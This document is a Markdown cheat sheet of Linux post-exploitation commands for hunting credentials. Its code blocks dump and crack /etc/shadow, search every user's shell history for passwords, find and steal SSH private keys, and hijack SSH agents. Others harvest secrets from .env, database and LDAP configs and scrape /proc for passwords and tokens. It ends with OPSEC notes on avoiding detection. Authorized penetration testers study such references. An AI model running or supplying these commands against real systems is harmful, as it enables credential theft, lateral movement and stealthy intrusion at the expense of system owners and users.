# Linux Credential Hunting Reference

## /etc/shadow and /etc/passwd

### Direct Access (root required)
```
# Read shadow file
cat /etc/shadow

# Common hash formats in shadow:
# $1$ = MD5crypt
# $5$ = SHA-256
# $6$ = SHA-512 (most common modern Linux)
# $y$ = yescrypt (newer distros)

# Combine for john/hashcat
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Crack with hashcat
hashcat -m 1800 shadow_hashes.txt wordlist.txt   # SHA-512
hashcat -m 500  shadow_hashes.txt wordlist.txt   # MD5crypt

# Check for users with password hashes (not locked/disabled)
awk -F: '($2 != "*" && $2 != "!" && $2 != "!!") {print $1":"$2}' /etc/shadow
```

### Readable Shadow (misconfiguration)
```
# Check permissions
ls -la /etc/shadow
# If world-readable → critical finding, extract immediately

# Check if you're in shadow group
id
groups
```

---

## History Files

### Bash/Zsh/Other History
```
# Current user
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.python_history
cat ~/.psql_history

# All users (root)
find /home -name ".*history" -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null
cat /root/.bash_history

# Search for credentials in history
grep -hri 'password\|passwd\|pass=\|secret\|token\|api_key\|mysql.*-p\|ssh.*-i' /home/*/.bash_history /root/.bash_history 2>/dev/null

# Check for commands that typically include passwords
grep -hE 'mysql|psql|ssh|ftp|curl.*-u|wget.*--password|sshpass|mount.*cifs' /home/*/.bash_history 2>/dev/null
```

---

## SSH Keys

### Find Private Keys
```
# Standard locations
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null

# Check if keys have passphrases
ssh-keygen -y -f /path/to/key   # Prompts for passphrase if protected

# Authorized keys (shows where these keys can authenticate)
find / -name "authorized_keys" -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null

# SSH config (may reveal hostnames, users, key paths)
cat ~/.ssh/config
cat /etc/ssh/ssh_config

# SSH known_hosts (reveals previously connected hosts)
cat ~/.ssh/known_hosts
```

### SSH Agent Hijacking
```
# Check for running SSH agents
find /tmp -name "agent.*" -type s 2>/dev/null
ls -la /tmp/ssh-*/

# Hijack agent (if accessible)
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.<PID>
ssh-add -l   # List keys in hijacked agent
ssh user@target   # Use stolen keys
```

---

## Configuration Files with Credentials

### Web Application Configs
```
# WordPress
cat /var/www/*/wp-config.php | grep -i 'DB_\|password\|secret\|salt'

# Laravel / PHP
find /var/www -name ".env" -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null

# Django
grep -ri 'SECRET_KEY\|PASSWORD\|DATABASE' /var/www/*/settings.py 2>/dev/null

# Node.js
find /var/www -name "config.js" -o -name "config.json" -o -name ".env" 2>/dev/null
```

### System Configs
```
# MySQL / MariaDB
cat /etc/mysql/debian.cnf             # Debian auto-maintenance creds
cat /etc/mysql/my.cnf | grep -i pass
cat ~/.my.cnf                          # User-specific MySQL config

# PostgreSQL
cat /var/lib/postgresql/.pgpass
cat ~/.pgpass

# NFS / CIFS mounts
cat /etc/fstab | grep -i 'cred\|pass\|user'
find / -name ".smbcredentials" 2>/dev/null

# LDAP
cat /etc/ldap/ldap.conf
grep -ri 'binddn\|bindpw' /etc/ 2>/dev/null

# Ansible vault files
find / -name "*.vault" -o -name "vault.yml" 2>/dev/null
grep -rl "ANSIBLE_VAULT" /etc/ /opt/ /home/ 2>/dev/null
```

### Broad Credential Search
```
# Search for password strings in config files
grep -rli 'password\|passwd\|secret\|api_key\|token\|credential' /etc/ /opt/ /var/ /home/ 2>/dev/null | head -50

# Find .env files
find / -name ".env" -not -path "*/node_modules/*" 2>/dev/null

# Find backup files that might contain creds
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*~" 2>/dev/null | head -30
```

---

## Memory and Process Credentials

### /proc Filesystem
```
# Environment variables (may contain passwords)
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|key|secret|token'

# Process command lines
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -iE 'pass|key|secret'

# Memory maps for credential strings
strings /proc/<PID>/maps 2>/dev/null | grep -i password
```

### Process Listing
```
# Check for credentials in running processes
ps auxwwe | grep -iE 'pass|key|secret|token'
ps aux | grep -E 'mysql|postgres|mongo|redis'

# Check for credential files in use
lsof | grep -iE 'password|credential|secret|\.env'
```

---

## OPSEC Notes
- Reading /etc/shadow requires root or shadow group membership
- History searches are passive and stealthy
- SSH key theft is silent but creates auth logs on target systems
- /proc access may be restricted by hidepid mount option
- Config file reads don't generate specific alerts but may show in auditd
